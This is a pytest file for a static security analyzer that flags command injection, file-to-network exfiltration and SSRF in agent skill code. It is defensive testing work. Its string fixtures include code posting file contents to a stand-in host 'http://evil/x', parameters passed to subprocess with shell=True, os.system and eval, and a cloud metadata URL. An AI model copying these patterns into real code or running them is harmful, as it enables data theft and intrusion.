"""Extended taint rules: TT5 (external-input -> exec/cmd), TT4 (file-read -> network),
TT_SSRF (tainted URL -> network-fetch).

Tests cover:
- Each new rule fires on the right source/sink pattern.
- clean_taint_logonly fixture is silent (no taint finding).
- never-raises contract holds on malformed source.
- Direct vs indirect flow distinction in evidence text.
- f-string propagation fires TT4.
- B13 integration: vet_skill on bad_taint_cmdinject (TT5/crit) -> FAIL/CRITICAL.
- vet_skill on clean_taint_logonly -> PASS.
- analyze_python directly confirms TT4/SSRF fire for info-severity fixtures.

Offline, deterministic. No network calls, no writes outside tmp_path.
"""
from __future__ import annotations

from pathlib import Path

from clawseccheck.catalog import FAIL, PASS
from clawseccheck.checks import vet_skill
from clawseccheck.skillast import analyze_python

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"


def _rules(src: str) -> dict[str, object]:
    return {f.rule: f for f in analyze_python(src, "t.py")}


# ---------------------------------------------------------------------------
# TT5: external-input -> exec / shell sink (CRITICAL "crit")
# ---------------------------------------------------------------------------

def test_tt5_param_to_subprocess_direct():
    src = (
        "import subprocess\n"
        "def run_cmd(cmd):\n"
        "    subprocess.run(cmd, shell=True)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_tt5_param_to_subprocess_indirect():
    src = (
        "import subprocess\n"
        "def run_cmd(cmd):\n"
        "    s = cmd\n"
        "    subprocess.run(s, shell=True)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"
    assert "indirect" in r["TT5_CMD_INJECTION"].reason or "direct" in r["TT5_CMD_INJECTION"].reason


def test_tt5_param_to_os_system():
    src = (
        "import os\n"
        "def run_cmd(cmd):\n"
        "    os.system(cmd)\n"
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_tt5_param_to_eval():
    src = (
        "def run_code(code):\n"
        "    eval(code)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_tt5_input_to_exec():
    src = (
        "cmd = input('Enter command: ')\n"
        "import os\n"
        "os.system(cmd)\n"
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_tt5_param_to_popen():
    src = (
        "import os\n"
        "def run_it(user_input):\n"
        "    os.popen(user_input)\n"
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_tt5_direct_flow_evidence():
    src = (
        "import subprocess\n"
        "def run_cmd(cmd):\n"
        "    subprocess.run(cmd, shell=True)\n"
    )
    r = _rules(src)
    assert "direct" in r["TT5_CMD_INJECTION"].reason


def test_tt5_indirect_flow_evidence():
    src = (
        "import subprocess\n"
        "def run_cmd(cmd):\n"
        "    s = cmd\n"
        "    subprocess.run(s, shell=True)\n"
    )
    r = _rules(src)
    # s=cmd propagates taint; s is the direct first arg at the call site
    assert "flow" in r["TT5_CMD_INJECTION"].reason


# ---------------------------------------------------------------------------
# TT4: file-read -> network data sink (HIGH "info")
# ---------------------------------------------------------------------------

def test_tt4_file_to_network_direct():
    src = (
        "import requests\n"
        "data = open('notes.txt').read()\n"
        "requests.post('http://evil/x', data=data)\n"
    )
    r = _rules(src)
    assert "TT4_FILE_NET" in r
    assert r["TT4_FILE_NET"].severity == "info"


def test_tt4_file_to_network_indirect():
    src = (
        "import requests\n"
        "raw = open('config.txt').read()\n"
        "payload = raw\n"
        "requests.post('http://evil/x', data=payload)\n"
    )
    r = _rules(src)
    assert "TT4_FILE_NET" in r
    assert r["TT4_FILE_NET"].severity == "info"


def test_tt4_file_to_network_fstring():
    src = (
        "import requests\n"
        "s = open('data.txt').read()\n"
        "requests.post('http://evil/x', data=f'value={s}')\n"
    )
    assert "TT4_FILE_NET" in _rules(src)


def test_tt4_read_text_method():
    src = (
        "import requests\n"
        "from pathlib import Path\n"
        "data = Path('config.txt').read_text()\n"
        "requests.post('http://evil/x', data=data)\n"
    )
    assert "TT4_FILE_NET" in _rules(src)


def test_tt4_file_read_without_network_is_silent():
    # Reading a file then returning it — no network sink — must NOT flag TT4.
    src = (
        "def get_config():\n"
        "    data = open('config.txt').read()\n"
        "    return data\n"
    )
    assert "TT4_FILE_NET" not in _rules(src)


def test_tt4_network_without_file_is_silent():
    # No file read — env var posted to network — TT4 must NOT fire.
    src = (
        "import os, requests\n"
        "secret = os.getenv('KEY')\n"
        "requests.post('http://x', data=secret)\n"
    )
    assert "TT4_FILE_NET" not in _rules(src)


# ---------------------------------------------------------------------------
# TT_SSRF: externally-controlled URL -> network fetch
# ---------------------------------------------------------------------------

def test_ssrf_param_to_requests_get_with_internal_literal():
    src = (
        "import requests\n"
        "_META = 'http://169.254.169.254/latest/meta-data/'\n"
        "def fetch(url):\n"
        "    return requests.get(url).text\n"
    )
    r = _rules(src)
    assert "TT_SSRF" in r
    assert r["TT_SSRF"].severity == "info"
    assert "169.254.169.254" in r["TT_SSRF"].reason or "internal endpoint" in r["TT_SSRF"].reason


def test_ssrf_param_to_requests_get_without_internal():
    src = (
        "import requests\n"
        "def fetch(url):\n"
        "    return requests.get(url).text\n"
    )
    r = _rules(src)
    assert "TT_SSRF" in r
    assert r["TT_SSRF"].severity == "info"
    # Without internal literal, evidence should note SSRF risk but not elevated
    assert "internal endpoint" not in r["TT_SSRF"].reason


def test_ssrf_param_to_urlopen():
    src = (
        "from urllib.request import urlopen\n"
        "def fetch(url):\n"
        "    return urlopen(url).read()\n"
    )
    assert "TT_SSRF" in _rules(src)


def test_ssrf_localhost_is_internal():
    src = (
        "import requests\n"
        "# backend lives at localhost\n"
        "def proxy(url):\n"
        "    return requests.get(url)\n"
    )
    r = _rules(src)
    assert "TT_SSRF" in r
    assert "internal endpoint" in r["TT_SSRF"].reason


def test_ssrf_no_param_no_finding():
    # URL is a literal constant — no tainted input reaches the fetch sink.
    src = (
        "import requests\n"
        "def fetch():\n"
        "    return requests.get('https://api.example.com/data').text\n"
    )
    assert "TT_SSRF" not in _rules(src)


# ---------------------------------------------------------------------------
# FP-safety: clean patterns must NOT fire new rules
# ---------------------------------------------------------------------------

def test_clean_env_log_only_no_taint():
    # Reads env var, logs bool — no sink reached.
    src = (
        "import os, logging\n"
        "logger = logging.getLogger(__name__)\n"
        "def check():\n"
        "    key = os.getenv('API_KEY')\n"
        "    logger.info('key set: %s', bool(key))\n"
        "    return bool(key)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT4_FILE_NET" not in r
    assert "TT_SSRF" not in r


def test_clean_return_only_no_taint():
    # Reads a file and returns it — no network sink.
    src = (
        "def get_data():\n"
        "    return open('notes.txt').read()\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT4_FILE_NET" not in r


def test_clean_subprocess_no_param_not_flagged():
    # subprocess with a literal command — no tainted input.
    src = (
        "import subprocess\n"
        "def check_version():\n"
        "    subprocess.run(['git', '--version'], shell=False)\n"
    )
    assert "TT5_CMD_INJECTION" not in _rules(src)


# ---------------------------------------------------------------------------
# Never-raises contract on malformed source
# ---------------------------------------------------------------------------

def test_analyze_never_raises_on_malformed():
    # F-057: parse failure now emits AST_UNANALYZABLE instead of []; must not raise.
    result = analyze_python("def (broken syntax!!!", "bad.py")
    assert len(result) == 1
    assert result[0].rule == "AST_UNANALYZABLE"


def test_analyze_never_raises_on_empty():
    assert analyze_python("", "empty.py") == []


def test_analyze_never_raises_on_bytes_garbage():
    # F-057: binary garbage triggers a SyntaxError; must emit AST_UNANALYZABLE, not [].
    result = analyze_python("\x00\xff\xfe", "bin.py")
    assert len(result) == 1
    assert result[0].rule == "AST_UNANALYZABLE"


# ---------------------------------------------------------------------------
# B13 integration: vet_skill on fixture directories
# ---------------------------------------------------------------------------

def test_vet_cmdinject_fixture_is_critical_fail():
    """TT5 (crit): param->subprocess.run must produce FAIL/CRITICAL via B13."""
    skill_dir = FIXTURES / "bad_taint_cmdinject" / "skills" / "cmdskill"
    f = vet_skill(skill_dir)
    assert f.status == FAIL
    assert f.severity == "CRITICAL"
    assert any("cmd" in e.lower() or "injection" in e.lower() for e in (f.evidence or []))


def test_vet_clean_logonly_is_pass():
    """Clean skill (env read + log only) must not produce FAIL."""
    skill_dir = FIXTURES / "clean_taint_logonly" / "skills" / "logskill"
    f = vet_skill(skill_dir)
    assert f.status == PASS


def test_vet_argv_listform_is_pass():
    """B13 FP regression: argv list-form subprocess (shell=False) must not FAIL.

    This is the smyx-payment class — a tainted value in a fixed-program argv list is
    argument injection (info), so vet_skill must PASS, not CRITICAL-FAIL.
    """
    skill_dir = FIXTURES / "clean_taint_argv_listform" / "skills" / "argvskill"
    f = vet_skill(skill_dir)
    assert f.status == PASS


# ---------------------------------------------------------------------------
# analyze_python direct checks for info-severity fixtures
# (TT4/SSRF are "info" — vet_skill only escalates them with cred_exfil_signal;
#  test at the analyzer level to confirm the rules fire correctly.)
# ---------------------------------------------------------------------------

def _py_source(fixture_name: str, skill: str, filename: str) -> str:
    p = FIXTURES / fixture_name / "skills" / skill / filename
    return p.read_text(encoding="utf-8")


def test_fixture_bad_taint_direct_fires_tt4():
    src = _py_source("bad_taint_direct", "exfilskill", "exfil.py")
    r = _rules(src)
    # env var (os.getenv) -> requests.post: this is NOT a file-read source, so TT4 should NOT fire.
    # But the env var IS a tainted source — check that no spurious finding fires either.
    # The fixture demonstrates env->post which is NOT TT4 (file-read only).
    # TT5 should not fire either (subprocess not present).
    assert "TT5_CMD_INJECTION" not in r


def test_fixture_bad_taint_indirect_fires_tt4():
    src = _py_source("bad_taint_indirect", "exfilskill", "exfil.py")
    r = _rules(src)
    assert "TT4_FILE_NET" in r
    assert r["TT4_FILE_NET"].severity == "info"


def test_fixture_bad_taint_fstring_fires_tt4():
    src = _py_source("bad_taint_fstring", "exfilskill", "exfil.py")
    r = _rules(src)
    assert "TT4_FILE_NET" in r


def test_fixture_bad_taint_cmdinject_fires_tt5():
    src = _py_source("bad_taint_cmdinject", "cmdskill", "runner.py")
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_fixture_bad_taint_ssrf_fires_ssrf():
    src = _py_source("bad_taint_ssrf", "ssrfskill", "fetch.py")
    r = _rules(src)
    assert "TT_SSRF" in r
    assert "internal endpoint" in r["TT_SSRF"].reason


def test_fixture_clean_logonly_is_silent():
    src = _py_source("clean_taint_logonly", "logskill", "tool.py")
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT4_FILE_NET" not in r
    assert "TT_SSRF" not in r


# ---------------------------------------------------------------------------
# Shell-form awareness: list-argv subprocess with shell=False is argument
# injection (info), NOT command injection (crit). Regression for the B13 FP
# class (smyx-payment): subprocess.run([prog, ..., tainted]) is not injectable.
# ---------------------------------------------------------------------------

def test_tt5_listform_argv_shell_false_is_arg_injection_not_crit():
    src = (
        "import subprocess, sys\n"
        "def handle(phone):\n"
        "    subprocess.run([sys.executable, '-m', 'scripts.query', phone], shell=False)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT5_ARG_INJECTION" in r
    assert r["TT5_ARG_INJECTION"].severity == "info"


def test_tt5_listform_argv_default_shell_is_arg_injection_not_crit():
    src = (
        "import subprocess, sys\n"
        "def handle(phone):\n"
        "    subprocess.run([sys.executable, '-m', 'q', phone])\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT5_ARG_INJECTION" in r


def test_tt5_listform_tainted_program_stays_crit():
    # Tainted value IS the program (list element 0) -> arbitrary exec -> crit.
    src = (
        "import subprocess\n"
        "def handle(prog):\n"
        "    subprocess.run([prog, '--flag'])\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_tt5_listform_with_shell_true_stays_crit():
    # shell=True ignores list safety: the shell interprets element 0 as a string.
    src = (
        "import subprocess, sys\n"
        "def handle(phone):\n"
        "    subprocess.run([sys.executable, phone], shell=True)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"


def test_tt5_string_command_shell_false_stays_crit():
    # Non-list first arg with a tainted program path -> arbitrary program exec -> crit.
    src = (
        "import subprocess\n"
        "def handle(prog):\n"
        "    subprocess.run(prog)\n"
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
